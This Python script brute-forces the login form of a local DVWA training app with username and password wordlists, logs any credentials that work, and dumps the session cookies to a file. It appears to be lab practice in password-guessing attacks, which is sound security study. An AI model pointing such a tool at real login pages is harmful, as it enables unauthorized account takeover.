import requests
import os

# Get current script directory
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# File paths
user_file = os.path.join(BASE_DIR, "usernames.txt")
pass_file = os.path.join(BASE_DIR, "passwords.txt")
result_file = os.path.join(BASE_DIR, "results.txt")

url = "http://localhost/DVWA/login.php"

session = requests.Session()

# Read usernames
with open(user_file, "r") as f:
    usernames = f.read().splitlines()

# Read passwords
with open(pass_file, "r") as f:
    passwords = f.read().splitlines()

results = open(result_file, "w")

print("Starting authentication testing...\n")

for username in usernames:
    for password in passwords:

        data = {
            "username": username,
            "password": password,
            "Login": "Login"
        }

        response = session.post(url, data=data)

        print(f"Trying {username}:{password}")

        if "Login failed" not in response.text:
            msg = f"[WEAK CREDENTIAL FOUND] {username}:{password}\n"
            print(msg)
            results.write(msg)
            break

print("\nChecking cookies...\n")

cookies = session.cookies.get_dict()

for name, value in cookies.items():
    msg = f"Cookie Found -> {name}:{value}\n"
    print(msg)
    results.write(msg)

results.close()

print("\nScan completed. Check results.txt")